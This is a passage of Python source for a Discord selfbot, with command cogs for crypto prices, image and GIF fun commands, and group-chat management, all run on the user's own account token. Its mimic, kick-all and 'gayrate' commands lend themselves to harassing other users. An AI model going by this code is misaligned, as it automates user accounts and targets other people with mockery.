        )
        await send(ctx,"Command Aliases",alias_message)

    @commands.command(aliases=['seeusage','usage','lookusage'])
    async def checkusage(self, ctx, command_name: str):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")          
        try:
            command = self.bot.get_command(command_name)        
            command_usage = command.usage or f"{prefix}{command.name} {command.signature}"  
            command_usage = command_usage.replace("<", "TEMP").replace("[", "<").replace("TEMP", "[").replace(">", "TEMP").replace("]", ">").replace("TEMP", "]")
            alias_message = (
                f"<:arrow:1554766539042062446> **Command :** **`{command.name}`**\n"
                f"<:arrow:1554766539042062446> **Usage :** **`{command_usage}`**"
            )
            await send(ctx,"Command Usage",alias_message,"[ REQUIRED ] | < OPTIONAL >")
        except:
            await ctx.send(f'**Command** **`{command_name}`** **not found**',delete_after=20)

    @commands.command()
    async def selfmode(self,ctx,option: int):
        await ctx.message.delete()
        if option not in [1,2,3]:
            await ctx.send("Usage: `selfmode <1|2|3>`",delete_after=10)
            return
        try:
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
        except FileNotFoundError:
            return
        if option == 1:
            config['mode'] = 1
            await send(ctx, "Selfmode", "<:arrow:1554766539042062446> Selfbot messages mode set to text mode (nitro needed).","10")
        elif option == 2:
            config['mode'] = 2
            await send(ctx, "Selfmode", "<:arrow:1554766539042062446> Selfbot messages mode set to embed mode.","10")
        elif option == 3:
            config['mode'] = 3        
            await send(ctx, "Selfmode", f"<:arrow:1554766539042062446> Selfbot messages mode set to OG MaG-Cord mode.","10")                   
        with open('config.json', 'w') as config_file:
            json.dump(config, config_file, indent=4)

class crypto(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def get_usd_to_inr_rate(self):
        try:
            response = requests.get('https://api.exchangerate-api.com/v4/latest/USD')
            if response.status_code == 200:
                data = response.json()
                return data['rates']['INR']
            else:
                return 85  
        except Exception as e:
            print(f"Error fetching INR exchange rate: {e}")
            return 85 

    def get_usd_to_eur_rate(self):
        try:
            response = requests.get('https://api.exchangerate-api.com/v4/latest/USD')
            if response.status_code == 200:
                data = response.json()
                return data['rates']['EUR']
            else:
                return 0.85  
        except Exception as e:
            print(f"Error fetching EUR exchange rate: {e}")
            return 0.85  

    async def fetch_crypto_price(self, coin_id):
        async with aiohttp.ClientSession() as session:
            url = f'https://api.coingecko.com/api/v3/coins/{coin_id}'
            async with session.get(url) as response:
                if response.status == 200:
                    return await response.json()
                return None

    async def get_crypto_price_embed(self, coin_name, coin_id, ctx):
        data = await self.fetch_crypto_price(coin_id)
        if data:
            price = data['market_data']['current_price']['usd']
            euro_price = price * self.get_usd_to_eur_rate()
            inr_price = price * self.get_usd_to_inr_rate()
            await send(ctx, f"{coin_name} Price", f"<:arrow:1554766539042062446> Current {coin_name} Price: `{price} $`, `{euro_price:.2f} €`, `{inr_price:.2f} ₹`", "30")
        else:
            await senderror(ctx, "Error", f"Failed to retrieve {coin_name} price")

    @commands.command()
    async def crypto(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:Crypto:1554760816677494895> | **Bitcoin Price** **:** **`{prefix}btcprice`**\n"
            f"<:Crypto:1554760816677494895> | **Ethereum Price** **:** **`{prefix}ethprice`**\n"
            f"<:Crypto:1554760816677494895> | **Binance Coin Price** **:** **`{prefix}bnbprice`**\n"
            f"<:Crypto:1554760816677494895> | **Cardano Price** **:** **`{prefix}adaprice`**\n"
            f"<:Crypto:1554760816677494895> | **Solana Price** **:** **`{prefix}solprice`**\n"
            f"<:Crypto:1554760816677494895> | **Dogecoin Price** **:** **`{prefix}dogeprice`**\n"
            f"<:Crypto:1554760816677494895> | **Ripple Price** **:** **`{prefix}xrpprice`**\n"
            f"<:Crypto:1554760816677494895> | **Litecoin Price** **:** **`{prefix}ltcprice`**\n"
            f"<:Crypto:1554760816677494895> | **Polkadot Price** **:** **`{prefix}dotprice`**\n"
            f"<:Crypto:1554760816677494895> | **Shiba Inu Price** **:** **`{prefix}shibprice`**\n"
            f"<:Crypto:1554760816677494895> | **Chainlink Price** **:** **`{prefix}linkprice`**\n"
            f"<:Crypto:1554760816677494895> | **Polygon Price** **:** **`{prefix}maticprice`**\n"
            f"<:Crypto:1554760816677494895> | **Avalanche Price** **:** **`{prefix}avaxprice`**\n"
            f"<:Crypto:1554760816677494895> | **Stellar Price** **:** **`{prefix}xlmprice`**\n"
            f"<:Crypto:1554760816677494895> | **Tron Price** **:** **`{prefix}trxprice`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Crypto Commands__<a:crown:1554756538445336626>", description)

    @commands.command(aliases=['btc'])
    async def btcprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Bitcoin (BTC)", "bitcoin", ctx)

    @commands.command(aliases=['eth'])
    async def ethprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Ethereum (ETH)", "ethereum", ctx)

    @commands.command(aliases=['bnb'])
    async def bnbprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Binance Coin (BNB)", "binancecoin", ctx)

    @commands.command(aliases=['ada'])
    async def adaprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Cardano (ADA)", "cardano", ctx)

    @commands.command(aliases=['sol'])
    async def solprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Solana (SOL)", "solana", ctx)

    @commands.command(aliases=['doge'])
    async def dogeprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Dogecoin (DOGE)", "dogecoin", ctx)

    @commands.command(aliases=['xrp'])
    async def xrpprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Ripple (XRP)", "ripple", ctx)

    @commands.command(aliases=['ltc'])
    async def ltcprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Litecoin (LTC)", "litecoin", ctx)

    @commands.command(aliases=['dot'])
    async def dotprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Polkadot (DOT)", "polkadot", ctx)

    @commands.command(aliases=['shib'])
    async def shibprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Shiba Inu (SHIB)", "shiba-inu", ctx)

    @commands.command(aliases=['link'])
    async def linkprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Chainlink (LINK)", "chainlink", ctx)

    @commands.command(aliases=['matic'])
    async def maticprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Polygon (MATIC)", "matic-network", ctx)

    @commands.command(aliases=['avax'])
    async def avaxprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Avalanche (AVAX)", "avalanche-2", ctx)

    @commands.command(aliases=['xlm'])
    async def xlmprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Stellar (XLM)", "stellar", ctx)

    @commands.command(aliases=['trx'])
    async def trxprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Tron (TRX)", "tron", ctx)

class fun(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.mimic_dict = {}
        self.mimic_block_messages = [
            "🚫 Hold up! Commands can't be mimicked.",
            "⚠️ Mimic blocked — commands aren't allowed.",
            "🤖 Command detected. Mimic Rejected.",
            "❌ Whoa there! Mimicking commands is disabled.",
            "🛑 Can't spoof commands. Try sending something else.",
            "🎯 Nope! Commands are off-limits for mimic mode.",
            "🧠 Nice try, but mimicking commands is a no-go.",
            "📵 Command mimic? Nah, we don’t do that here.",
            "👀 Can’t copy commands, only real ones allowed.",
            "💀 Bro, you really tried to mimic a command? No.",
            "🧍‍♂️ This ain’t ChatGPT for bots, stop trying to mimic commands.",
            "🔒 Command mimic mode: disabled by order of the admin gods.",
            "🫡 Respectfully, mimic mode doesn’t do commands.",
        ]
    async def fetch_image(self, url: str):
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None

    async def send_image(self, ctx, user: discord.Member, action: str, api_url: str):
        try:
            res = await self.fetch_image(api_url)
            if res:
                if 'url' in res:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(res['url']) as resp:
                            if resp.status == 200:
                                image = await resp.read()
                                with io.BytesIO(image) as file:
                                    await ctx.send(user.mention, file=discord.File(file, f"spy_{action}.gif"))
                            else:
                                await ctx.send(f"**An error occurred: Failed to fetch the image from the URL**")
                else:
                    await ctx.send(f"**An error occurred: 'url' not found in response**\nResponse: {res}")
            else:
                await ctx.send(f"**An error occurred: Failed to fetch response from the API**")
        except Exception as e:
            await ctx.send(f"**An error occurred: {e}**")

    @commands.command()
    async def fun(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")        
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Feed User** **:** **`{prefix}feed <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Tickle User** **:** **`{prefix}tickle <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Slap User** **:** **`{prefix}slap <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Hug User** **:** **`{prefix}hug <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Mimic User** **:** **`{prefix}mimic <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Unmimic User** **:** **`{prefix}unmimic <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Stop Mimic (all tasks)** **:** **`{prefix}stopmimic`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Cuddle User** **:** **`{prefix}cuddle <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Smug Expression** **:** **`{prefix}smug <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Pat User** **:** **`{prefix}pat <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Kiss User** **:** **`{prefix}kiss <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Poke User** **:** **`{prefix}poke <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Wink at User** **:** **`{prefix}wink <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Boop User** **:** **`{prefix}boop <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Nom User** **:** **`{prefix}nom <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Gayrate User** **:** **`{prefix}gayrate <user>`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Random Meme** **:** **`{prefix}meme`**\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **Random Joke** **:** **`{prefix}joke`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Fun Commands__<a:crown:1554756538445336626>", description)

    @commands.command()
    async def mimic(self, ctx, user: discord.User):
        await ctx.message.delete()
        channel_id = ctx.channel.id
        if channel_id not in self.mimic_dict:
            self.mimic_dict[channel_id] = []

        if user.id not in self.mimic_dict[channel_id]:
            self.mimic_dict[channel_id].append(user.id)
            await ctx.send(f"**✅ Now mimicking {user.mention} in this channel.**")
        else:
            await ctx.send(f"**⚠️ Already mimicking {user.mention} here.**")

    @commands.command()
    async def unmimic(self, ctx, user: discord.User):
        await ctx.message.delete()
        channel_id = ctx.channel.id
        if channel_id in self.mimic_dict and user.id in self.mimic_dict[channel_id]:
            self.mimic_dict[channel_id].remove(user.id)
            if not self.mimic_dict[channel_id]:
                del self.mimic_dict[channel_id]
            await ctx.send(f"**❌ Stopped mimicking {user.mention} in this channel.**")
        else:
            await ctx.send(f"**⚠️ {user.mention} is not being mimicked here.**")


    @commands.command()
    async def stopmimic(self, ctx):
        await ctx.message.delete()
        self.mimic_dict.clear()
        await ctx.send("**🛑 All mimic tasks have been stopped globally.**")



    @commands.Cog.listener()
    async def on_message(self, message):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")        
        channel_id = message.channel.id
        if channel_id in self.mimic_dict:
            if message.author.id in self.mimic_dict[channel_id]:
                if message.content.startswith(prefix):
                    command_name = message.content[len(prefix):].split()[0]  
                    command = mag.get_command(command_name)
                    if command:
                        await message.reply(random.choice(self.mimic_block_messages),delete_after=10)                        
                        return                
                await message.channel.send(message.content)


    @commands.command()
    async def gayrate(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        if user is None:
            user = ctx.author
        gay_percentage = 0 if user == ctx.author else random.randint(0, 100)
        await ctx.send(f"<a:S_rainbow_fun:1554758074688999446> {user.mention} is {gay_percentage}% gay! <a:S_rainbow_fun:1554758074688999446>")


    @commands.command()
    async def feed(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'feed', "https://nekos.life/api/v2/img/feed")

    @commands.command()
    async def tickle(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'tickle', "https://nekos.life/api/v2/img/tickle")

    @commands.command()
    async def slap(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'slap', "https://nekos.life/api/v2/img/slap")

    @commands.command()
    async def hug(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'hug', "https://nekos.life/api/v2/img/hug")

    @commands.command()
    async def cuddle(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'cuddle', "https://nekos.life/api/v2/img/cuddle")

    @commands.command()
    async def smug(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'smug', "https://nekos.life/api/v2/img/smug")

    @commands.command()
    async def pat(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'pat', "https://nekos.life/api/v2/img/pat")

    @commands.command()
    async def kiss(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'kiss', "https://nekos.life/api/v2/img/kiss")

    @commands.command()
    async def poke(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'poke', "https://nekos.life/api/v2/img/poke")

    @commands.command()
    async def wink(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'wink', "https://nekos.life/api/v2/img/wink")

    @commands.command()
    async def boop(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'boop', "https://nekos.life/api/v2/img/boop")

    @commands.command()
    async def nom(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'nom', "https://nekos.life/api/v2/img/nom")

    @commands.command()
    async def meme(self,ctx):
        await ctx.message.delete()
        await self.send_image(ctx, ctx.author,'meme',"https://meme-api.com/gimme")

    @commands.command()
    async def joke(self,ctx):
        await ctx.message.delete()
        response = requests.get('https://official-joke-api.appspot.com/random_joke')
        joke = response.json()
        await ctx.send(f"<:arrow:1554766539042062446> {joke['setup']}\n<:arrow:1554766539042062446> {joke['punchline']}")  

class gc(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.api_base_url = "https://discord.com/api/v9"
    
    @commands.command()
    async def gc(self, ctx):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        await ctx.message.delete()
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:chat:1554762245362425917> | **Make Group** **:** **`{prefix}makegc <user>`**\n"
            f"<:chat:1554762245362425917> | **Rename Group** **:** **`{prefix}renamegc <name>`**\n"
            f"<:chat:1554762245362425917> | **Leave Group** **:** **`{prefix}leavegc`**\n"
            f"<:chat:1554762245362425917> | **Leave all Group** **:** **`{prefix}leavegcs`**\n"
            f"<:chat:1554762245362425917> | **Kick from Group** **:** **`{prefix}kickgc <user>`**\n"
            f"<:chat:1554762245362425917> | **Add to Group** **:** **`{prefix}addgc <user>`**\n"
            f"<:chat:1554762245362425917> | **List Group** **:** **`{prefix}listgc`**\n"
            f"<:chat:1554762245362425917> | **Group info** **:** **`{prefix}gcinfo`**\n"

            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__GC Commands__<a:crown:1554756538445336626>", description)

    @commands.command(aliases=["leaveallgc"])
    async def leavegcs(self, ctx):
        for channel in self.bot.private_channels:
            if isinstance(channel, discord.GroupChannel):
                try:
                    await channel.leave()
                except:
                    pass
    @commands.command()
    async def makegc(self, ctx, user=None):
        await ctx.message.delete()

        token = self.bot.http.token
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }
        async with aiohttp.ClientSession(headers=headers) as session:
            payload = {"recipients": []}
            async with session.post("https://discord.com/api/v10/users/@me/channels", json=payload) as response:
                if response.status == 200:
                    data = await response.json()
                    channel_id = data["id"]
                    content = f"Group channel created successfully! <#{channel_id}>"
                    if user:
                        if user.startswith("<@") and user.endswith(">"):
                            user_id = user.strip("<@!>")
                        else:
                            user_id = user

                        if not user_id.isdigit():
                            await send(ctx, "Error", "Invalid user mention or ID.")
                            return

                        channel = await self.bot.fetch_channel(channel_id)
                        if channel:
                            with open('config.json', 'r') as config_file:
                                config = json.load(config_file)
                            prefix = config.get("prefix")    
                            await channel.send(f"{prefix}addgc {user_id}")
                        else:
                            content += "\nFailed to fetch the created channel for adding the user."
                    await send(ctx, "GC Created", content)
                else:
                    error_msg = await response.text()
                    await send(
                        ctx,
                        "Error",
                        f"Failed to create group channel. Status: {response.status}, Error: {error_msg}",
                    )


    @commands.command()
    async def renamegc(self, ctx, *, name: str):
        await ctx.message.delete()
        if not ctx.channel or ctx.channel.type.name != "group":
            await ctx.send("This command can only be used in a Gc.")
            return        
        token = self.bot.http.token
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }
        async with aiohttp.ClientSession(headers=headers) as session:
            payload = {"name": name}
            async with session.patch(f"{self.api_base_url}/channels/{ctx.channel.id}", json=payload) as response:
                if response.status == 200:
                    await send(ctx,"Gc Renamed",f"<:arrow:1554766539042062446> Group chat name successfully changed to **{name}**!")
                else:
                    await ctx.send(f"Failed to rename the group chat. Status code: {response.status}", delete_after=10)

    @commands.command()
    async def leavegc(self, ctx):
        await ctx.message.delete()
        await ctx.channel.close()

    @commands.command()
    async def kickgc(self, ctx, user: str):
        await ctx.message.delete()
        if user.startswith("<@") and user.endswith(">"):
            user_id = user.strip("<@!>")
        else:
            user_id = user
        if not user_id.isdigit():
            await ctx.send("Invalid user mention or ID.")
            return
        token = self.bot.http.token
        headers = {"Authorization": token}
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.delete(
                f"{self.api_base_url}/channels/{ctx.channel.id}/recipients/{user_id}", headers=headers
            ) as response:
                if response.status == 204:
                    await send(ctx, "User Kicked", f"<:arrow:1554766539042062446> User <@{user_id}> has been kicked from the Gc.")
                else:
                    await ctx.send(f"Failed to kick user <@{user_id}>.")

    @commands.command()
    async def addgc(self, ctx, user: str):
        await ctx.message.delete()
        if user.startswith("<@") and user.endswith(">"):
            user_id = user.strip("<@!>")
        else:
            user_id = user
        if not user_id.isdigit():
            await ctx.send("Invalid user mention or ID.")
            return
        token = self.bot.http.token
        headers = {"Authorization": token}
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.put(
                f"{self.api_base_url}/channels/{ctx.channel.id}/recipients/{user_id}", headers=headers
            ) as response:
                if response.status == 204:
                    await send(ctx, "User Added", f"<:arrow:1554766539042062446> User <@{user_id}> has been added to the Gc.")
                else:
                    await ctx.send(f"Failed to add user <@{user_id}>. Status code: {response.status}")

    @commands.command()
    async def gckickall(self,ctx):
        await ctx.message.delete()
        for member in ctx.channel.recipients:
            token = self.bot.http.token
            headers = {"Authorization": token}
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.delete(
                    f"{self.api_base_url}/channels/{ctx.channel.id}/recipients/{member.id}", headers=headers
                ) as response:
                    if response.status == 204:
                        pass
                    else:
                        await ctx.send(f"Failed to kick user <@{member.id}>.")        


    @commands.command()
    async def listgc(self, ctx):
        await ctx.message.delete()
        token = self.bot.http.token
        headers = {"Authorization": token}
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(f"{self.api_base_url}/users/@me/channels", headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    gc_list = [f"<#{gc['id']}> - **{gc['name']}**" for gc in data if gc['type'] == 3]
                    description = "\n<:arrow:1554766539042062446> ".join(gc_list) if gc_list else "No Gcs found."
                    await send(ctx, "Gc List", description)
                else:
                    await ctx.send(f"Failed to fetch Gcs. Status code: {response.status}")

    @commands.command()
    async def gcinfo(self, ctx):
        await ctx.message.delete()
        members = [f"\n<:arrow:1554766539042062446> <@{member.id}> - {member.name}" for member in ctx.channel.recipients]
        description = "".join(members)
        await send(ctx, f"Gc Info", description)


API_LOL = 'google_search_api_key'
CX_ID = 'google_search_cx'

class images(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def send_image(self, ctx, url, filename):
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    image_data = await response.read()  
                    image_file = discord.File(io.BytesIO(image_data), filename=filename) 
                    await ctx.send(file=image_file)  
                else:
                    await ctx.send("Failed to retrieve image.", delete_after=10)

    @commands.command()
    async def images(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<a:pictures:1554758295003336714> | **Random Dog** **:** **`{prefix}dog`** \n"
            f"<a:pictures:1554758295003336714> | **Random Cat** **:** **`{prefix}cat`**\n"
            f"<a:pictures:1554758295003336714> | **Sad Cat** **:** **`{prefix}sadcat`**\n"
            f"<a:pictures:1554758295003336714> | **Random Rabbit** **:** **`{prefix}rabbit`**\n"
            f"<a:pictures:1554758295003336714> | **Random Fox** **:** **`{prefix}fox`**\n"
            f"<a:pictures:1554758295003336714> | **PHub Logo** **:** **`{prefix}phlogo <text1> <text2>`**\n"
            f"<a:pictures:1554758295003336714> | **PHub Comment** **:** **`{prefix}phcomment <name> <comment>`**\n"
            f"<a:pictures:1554758295003336714> | **Google Image** **:** **`{prefix}gimage <query>`**\n"
            f"<a:pictures:1554758295003336714> | **AI Image** **:** **`{prefix}genimage <prompt>`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"            
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Images Commands__<a:crown:1554756538445336626>", description)


    @commands.command()
    async def dog(self, ctx):
        await ctx.message.delete()
        r = requests.get("https://dog.ceo/api/breeds/image/random").json()
        link = str(r['message'])
        await self.send_image(ctx, link, "dog.png")

    @commands.command()
    async def cat(self, ctx):
        await ctx.message.delete()
        r = requests.get("https://api.thecatapi.com/v1/images/search").json()
        link = str(r[0]["url"])
        await self.send_image(ctx, link, "cat.png")

    @commands.command()
    async def rabbit(self, ctx):
        await ctx.message.delete()
        r = requests.get("https://api.bunnies.io/v2/loop/random/?media=gif,png").json()
        link = str(r['media']['gif'])
        await self.send_image(ctx, link, "rabbit.gif")

    @commands.command()
    async def sadcat(self, ctx):
        await ctx.message.delete()
        r = requests.get("https://api.alexflipnote.dev/sadcat").json()
        link = str(r['file'])
        await self.send_image(ctx, link, "rabbit.gif")

    @commands.command()
    async def fox(self, ctx):
        await ctx.message.delete()
        r = requests.get('https://randomfox.ca/floof/').json()
        link = str(r["image"])
        await self.send_image(ctx, link, "fox.png")

    @commands.command(aliases=['google','googleimg','gsearch'])
    async def gimage(self,ctx, *, query: str):
        await ctx.message.delete()
        api_key = config.get('google_search_api_key', API_LOL)
        cx = config.get('google_search_cx', CX_ID)
        url = 'https://www.googleapis.com/customsearch/v1'
        params = {
            'key': api_key,
            'cx': cx,
            'q': query,
            'searchType': 'image',
            'num': 1
        }
        response = requests.get(url, params=params).json()
        try:
            image_url = response['items'][0]['link']
            await self.send_image(ctx,image_url,"gimage.png")
        except Exception as e:
            await senderror(ctx,"Error","An unknown error occured")

    @commands.command(aliases=["pornhublogo", "phlogo"])
    async def pornhub(self, ctx, word1=None, word2=None):
        await ctx.message.delete()
        if word1 is None or word2 is None:
            await ctx.send("Missing parameters")
            return
        endpoint = f"https://api.alexflipnote.dev/pornhub?text={word1}&text2={word2}"
        await self.send_image(ctx, endpoint, "phlogo.png")

    @commands.command(aliases=["pornhubcomment", 'phc'])
    async def phcomment(self, ctx, user: discord.Member, *, args=None):
        await ctx.message.delete()
        if user is None or args is None:
            await ctx.send("Missing parameters")
            return
        endpoint = f"https://nekobot.xyz/api/imagegen?type=phcomment&text={args}&username={user.name}&image={user.avatar.url}"
        r = requests.get(endpoint)
        res = r.json()
        await self.send_image(ctx, res["message"], "phcomment.png")

    @commands.command(aliases=['genimage','genimg'])
    async def img(self, ctx, *, prompt: str):
        await ctx.message.delete()
        api_url = "https://api.kastg.xyz/api/ai/aiig"
